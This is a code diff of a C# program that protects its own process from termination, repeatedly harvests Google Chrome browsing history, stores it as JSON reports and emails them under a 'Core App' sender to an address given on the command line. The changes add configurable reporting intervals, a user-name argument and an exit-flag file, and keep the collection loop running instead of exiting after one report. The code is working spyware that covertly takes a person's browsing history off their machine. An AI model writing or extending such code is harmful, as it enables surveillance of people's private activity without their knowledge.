@@ -25,13 +25,14 @@ namespace Core
         static ChromeBrowser cb;
 
         static string UserName = string.Empty;
-
         static string SendTo = string.Empty;
         static string SendFrom = string.Empty;
         static string SendFromPassword = string.Empty;
-        static int ReportCount = 3;
+        static int ReportCount = 0;
+        static int ReprotTimeoutMinutes = 0;
 
         static int iteration = 0;
+        static string exit = $@"{Environment.CurrentDirectory}\application_exit.information";
 
         static void Main(string[] args)
         {
@@ -39,12 +40,21 @@ namespace Core
             ProtectionProcess pp = new ProtectionProcess();
             pp.ProtectionOn(Process.GetCurrentProcess().Handle);
 
-            SendTo = args[0];
-            SendFrom = args[1];
-            SendFromPassword = args[2];
+            try
+            {
+                SendTo = args[0];
+                SendFrom = args[1];
+                SendFromPassword = args[2];
+                UserName = args[3];
+                ReportCount = args[4].ToInt(1);
+                ReprotTimeoutMinutes = args[5].ToInt(1);
+            }
+            catch { Environment.Exit(1); }
+            
+            CheckForExit(true);
 
             cb = new ChromeBrowser();
-            timer = new Timer(1000 * 60 * .5d);
+            timer = new Timer(1000 * 60 * ReprotTimeoutMinutes);
             timer.Elapsed += TimerElapsed;
 
             GetGoogleChromeHistory();
@@ -53,6 +63,22 @@ namespace Core
             while (true) { }
         }
 
+        static void CheckForExit(bool first = false)
+        {
+            if (File.Exists(exit) && first)
+                using (StreamWriter sw = File.CreateText(exit))
+                    sw.Write("o");
+            else if (File.Exists(exit))
+            {
+                if (File.ReadAllText(exit) == "e")
+                    Environment.Exit(0);
+                else
+                    return;
+            }
+            else if (!File.Exists(exit))
+                using (StreamWriter sw = File.CreateText(exit))
+                    sw.Write("o");
+        }
         static void SendReport(string browserName, string report)
         {
             var fromAddress = new MailAddress(SendFrom, "Core App");
@@ -89,21 +115,20 @@ namespace Core
 
             File.Delete(report);
 
-            Environment.Exit(0);
             iteration = 0;
         }
         static void SaveReport(string browserName, List<HistoryElement> history)
         {
             if (!Directory.Exists($@"{Environment.CurrentDirectory}\reports\{browserName} "))
                 Directory.CreateDirectory($@"{Environment.CurrentDirectory}\reports\{browserName} ");
-            
+
             using (StreamWriter sw = File.CreateText($@"{Environment.CurrentDirectory}\reports\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json"))
                 sw.Write(JsonConvert.SerializeObject(history));
         }
-        static async Task<string> PrepareReport(string browserName)
+        static string PrepareReport(string browserName)
         {
             string path = $@"{Environment.CurrentDirectory}\reports\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json";
-            
+
             List<HistoryElement> listForWrite = new List<HistoryElement>();
 
             foreach (var item in Directory.GetFiles($@"{Environment.CurrentDirectory}\reports\{browserName}"))
@@ -120,22 +145,24 @@ namespace Core
             }
 
             using (StreamWriter sw = File.CreateText(path))
-                await sw.WriteAsync(JsonConvert.SerializeObject(listForWrite));
+                sw.Write(JsonConvert.SerializeObject(listForWrite));
 
             return path;
         }
 
-        static async void GetGoogleChromeHistory(bool send = false)
+        static void GetGoogleChromeHistory(bool send = false)
         {
             cb.UpdateHistory();
             SaveReport(cb.Name, cb.History);
 
             if (send)
-                SendReport(cb.Name, await PrepareReport(cb.Name));
+                SendReport(cb.Name, PrepareReport(cb.Name));
         }
 
         private static void TimerElapsed(object sender, ElapsedEventArgs e)
         {
+            CheckForExit();
+
             iteration++;
             GetGoogleChromeHistory(iteration > ReportCount);
 
